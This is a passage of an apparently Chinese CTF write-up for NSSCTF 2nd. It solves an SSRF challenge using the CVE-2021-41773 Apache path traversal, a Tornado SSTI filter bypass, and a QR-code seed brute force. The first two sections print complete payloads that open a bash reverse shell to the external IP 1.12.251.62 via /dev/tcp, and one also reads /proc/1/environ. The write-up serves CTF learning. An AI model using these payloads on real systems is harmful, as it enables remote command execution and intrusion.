class="hljs-string">&#x27;_&#x27;</span>+new<br><span class="hljs-comment">#注意两次url编码</span><br><span class="hljs-built_in">print</span>(urllib.parse.quote(result))<br></code></pre></td></tr></table></figure><p>以为flag在当前目录，回显404，但是这里有一个关键，Apache版本为2.4.49，以前复现过的CVE-2021-41773，可以目录穿越</p><figure><img src="/img/NSSCTF%202nd/17006210686831.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>CVE-2021-41773的payload:<code>/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> urllib.parse<br>test =<span class="hljs-string">&quot;&quot;&quot;GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1:80</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Content-Length: 51</span><br><span class="hljs-string"></span><br><span class="hljs-string">bash -c &quot;bash -i &amp;&gt; /dev/tcp/1.12.251.62/4567 0&gt;&amp;1&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>tmp = urllib.parse.quote(test)<br>new = tmp.replace(<span class="hljs-string">&#x27;%0A&#x27;</span>,<span class="hljs-string">&#x27;%0D%0A&#x27;</span>)<br>result = <span class="hljs-string">&#x27;mybox://127.0.0.1:80/&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+new<br><span class="hljs-built_in">print</span>(urllib.parse.quote(result))<br><span class="hljs-comment">#mybox%3A//127.0.0.1%3A80/_GET%2520/cgi-bin/.%25252e/.%25252e/.%25252e/.%25252e/.%25252e/bin/sh%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252051%250D%250A%250D%250Abash%2520-c%2520%2522bash%2520-i%2520%2526%253E%2520/dev/tcp/1.12.251.62/4567%25200%253E%25261%2522%250D%250A</span><br></code></pre></td></tr></table></figure><figure><img src="/img/NSSCTF%202nd/17006210686832.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Python">daemon@d22eb7fdd4144138:/<span class="hljs-built_in">bin</span>$ cat /nevvvvvver_f1nd_m3_the_t3ue_flag<br><br>NSSCTF&#123;dfaa40bc-dab6-433a-a970-ec0e3b5ba084&#125;<br></code></pre></td></tr></table></figure><h2 id="myhurricane">MyHurricane</h2><p>参考https://blog.csdn.net/miuzzx/article/details/123329244</p><p>开局源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> tornado.ioloop<br><span class="hljs-keyword">import</span> tornado.web<br><span class="hljs-keyword">import</span> os<br><br>BASE_DIR = os.path.dirname(__file__)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">data</span>):<br>    bl = [<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;__&#x27;</span>, <span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;or&#x27;</span>, <span class="hljs-string">&#x27;and&#x27;</span>, <span class="hljs-string">&#x27;not&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#123;&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#125;&#x27;</span>]<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> bl:<br>        <span class="hljs-keyword">if</span> c <span class="hljs-keyword">in</span> data:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> data.split():<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> chunk:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (<span class="hljs-number">31</span> &lt; <span class="hljs-built_in">ord</span>(c) &lt; <span class="hljs-number">128</span>):<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexHandler</span>(tornado.web.RequestHandler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(__file__, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            self.finish(f.read())<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">post</span>(<span class="hljs-params">self</span>):<br>        data = self.get_argument(<span class="hljs-string">&quot;ssti&quot;</span>)<br>        <span class="hljs-keyword">if</span> waf(data):<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.html&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                f.write(<span class="hljs-string">f&quot;&quot;&quot;&lt;html&gt;</span><br><span class="hljs-string">                        &lt;head&gt;&lt;/head&gt;</span><br><span class="hljs-string">                        &lt;body style=&quot;font-size: 30px;&quot;&gt;<span class="hljs-subst">&#123;data&#125;</span>&lt;/body&gt;&lt;/html&gt;</span><br><span class="hljs-string">                        &quot;&quot;&quot;</span>)<br>                f.flush()<br>            self.render(<span class="hljs-string">&#x27;1.html&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            self.finish(<span class="hljs-string">&#x27;no no no&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app = tornado.web.Application([<br>            (<span class="hljs-string">r&quot;/&quot;</span>, IndexHandler),<br>        ], compiled_template_cache=<span class="hljs-literal">False</span>)<br>    app.listen(<span class="hljs-number">827</span>)<br>    tornado.ioloop.IOLoop.current().start()<br></code></pre></td></tr></table></figure><p>tornadossti，过滤了<code>['\'', '"', '__', '(', ')', 'or', 'and', 'not', '&#123;&#123;', '&#125;&#125;']</code></p><p>过滤了<code>&#123;&#123;&#125;&#125;</code>用<code>&#123;%%&#125;</code>代替</p><p>过滤了and和or其实就是不能用<code>handler</code>和<code>import</code></p><p>这里利用了<code>_tt_utf8</code>进行变量覆盖，<code>set _tt_utf8=eval</code></p><p>原理</p><figure><img src="/img/NSSCTF%202nd/17006210686833.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>过滤了单引号和双引号，可能要加另一个变量替换（即<spanclass="math inline">\(a(\)</span>b)&amp;$b=""），这里利用<code>request.body_arguments[request.method]</code>，返回的变量名为<code>GET</code>、<code>POST</code>...</p><p>最后payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Python">ssti=&#123;% raw request.body_arguments[request.method][<span class="hljs-number">0</span>]%0a    _tt_utf8 = <span class="hljs-built_in">eval</span>%&#125;&amp;POST=<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;%26 /dev/tcp/1.12.251.62/4567 &lt;%261&#x27;&quot;</span>)<br>ssti=&#123;% <span class="hljs-built_in">set</span> _tt_utf8 =<span class="hljs-built_in">eval</span> %&#125;&#123;% raw request.body_arguments[request.method][<span class="hljs-number">0</span>] %&#125;&amp;POST=<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;%26 /dev/tcp/1.12.251.62/4567 0&lt;%261&#x27;&quot;</span>)<br><br><span class="hljs-comment">#非预期</span><br>ssti=&#123;% include /proc/<span class="hljs-number">1</span>/environ %&#125;<br></code></pre></td></tr></table></figure><figure><img src="/img/NSSCTF%202nd/17006210686844.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><img src="/img/NSSCTF%202nd/17006210686845.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>flag在env中</p><h1 id="misc">MISC</h1><h2 id="gift_in_qrcoderevenge">gift_in_qrcode(revenge)</h2><p>给了源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> qrcode<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randrange, getrandbits, seed<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> base64<br><br>flag = os.getenv(<span class="hljs-string">&quot;FLAG&quot;</span>)<br><span class="hljs-keyword">if</span> flag == <span class="hljs-literal">None</span>:<br>    flag = <span class="hljs-string">&quot;flag&#123;test&#125;&quot;</span><br><br>secret_seed = randrange(<span class="hljs-number">1</span>, <span class="hljs-number">1000</span>)<br>seed(secret_seed)<br>reveal = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>    reveal.append(<span class="hljs-built_in">str</span>(getrandbits(<span class="hljs-number">8</span>)))<br>target = getrandbits(<span class="hljs-number">8</span>)<br>reveal = <span class="hljs-string">&quot;,&quot;</span>.join(reveal)<br><br>img_qrcode = qrcode.make(reveal)<br>img_qrcode = img_qrcode.crop((<span class="hljs-number">35</span>, <span class="hljs-number">35</span>, img_qrcode.size[<span class="hljs-number">0</span>] - <span class="hljs-number">35</span>, img_qrcode.size[<span class="hljs-number">1</span>] - <span class="hljs-number">35</span>))<br><br>offset, delta, rate = <span class="hljs-number">50</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span><br>img_qrcode = img_qrcode.resize(<br>    (<span class="hljs-built_in">int</span>(img_qrcode.size[<span class="hljs-number">0</span>] / rate), <span class="hljs-built_in">int</span>(img_qrcode.size[<span class="hljs-number">1</span>] / rate)), Image.LANCZOS<br>)<br>img_out = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>, img_qrcode.size)<br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(img_qrcode.size[<span class="hljs-number">1</span>]):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(img_qrcode.size[<span class="hljs-number">0</span>]):<br>        pixel_qrcode = img_qrcode.getpixel((x, y))<br>        <span class="hljs-keyword">if</span> pixel_qrcode == <span class="hljs-number">255</span>:<br>            img_out.putpixel(<br>                (x, y),<br>                (<br>                    randrange(offset, offset + delta),<br>                    randrange(offset, offset + delta),<br>                    randrange(offset, offset + delta),<br>                ),<br>            )<br>        <span class="hljs-keyword">else</span>:<br>            img_out.putpixel(<br>                (x, y),<br>                (<br>                    randrange(offset - delta, offset),<br>                    randrange(offset - delta, offset),<br>                    randrange(offset - delta, offset),<br>                ),<br>            )<br><br>img_out.save(<span class="hljs-string">&quot;qrcode.png&quot;</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;qrcode.png&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.read()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;This my gift:&quot;</span>)<br><span class="hljs-built_in">print</span>(base64.b64encode(data).decode(), <span class="hljs-string">&quot;\n&quot;</span>)<br><br>ans = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;What&#x27;s your answer:&quot;</span>)<br><span class="hljs-keyword">if</span> ans == <span class="hljs-built_in">str</span>(target):<br>    <span class="hljs-built_in">print</span>(flag)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No no no!&quot;</span>)<br></code></pre></td></tr></table></figure><p>题目大致思路：server端给出一个经过像素扰动的qrcode（范围<code>offset, delta, rate = 50, 3, 5</code>）的base64码，这个qrcode扫出来是一个有20个数字的数组，这些数字是由seed随机产生的，服务端接收1个数字，如果这个数字是qrcode里的数组中的第21个，则输出flag</p><p>思路不是很难，因为<code>secret_seed = randrange(1, 1000)</code>，产生随机数的seed给了范围，所以可以爆破第21个数字。主要难点在于像素扰动扫码以及爆破数字</p><p>学习一下wp，使用np.where还原，pyzbar识别二维码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">from</span> pyzbar <span class="hljs-keyword">import</span> pyzbar<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> getrandbits, seed<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getTarget</span>(<span class="hljs-params">rec</span>):<br>    <span class="hljs-comment"># 1.读取二维码</span><br>    img_bytes = base64.b64decode(rec)<br>    img_array = np.frombuffer(img_bytes, np.uint8)<br>    img = cv2.imdecode(img_array, cv2.IMREAD_GRAYSCALE)<br><br>    <span class="hljs-comment"># 2.还原二维码</span><br>    img = np.where(img &lt; <span class="hljs-number">50</span>, <span class="hljs-number">0</span>, <span class="hljs-number">255</span>)<br>    <span class="hljs-comment"># cv2.imshow(&quot;img&quot;, img.astype(np.uint8))</span><br><br>    <span class="hljs-comment"># 3.扫描二维码解析</span><br>    lis = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, pyzbar.decode(img)[<span class="hljs-number">0</span>].data.decode().split(<span class="hljs-string">&quot;,&quot;</span>)))<br>    <span class="hljs-built_in">print</span>(lis)<br><br>    <span class="hljs-comment"># 4.爆破Target</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1000</span>):<br>        seed(i)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">all</span>(getrandbits(<span class="hljs-number">8</span>) == lis[j] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>)):<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(getrandbits(<span class="hljs-number">8</span>))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    rec = <span class="hljs-string">b&#x27;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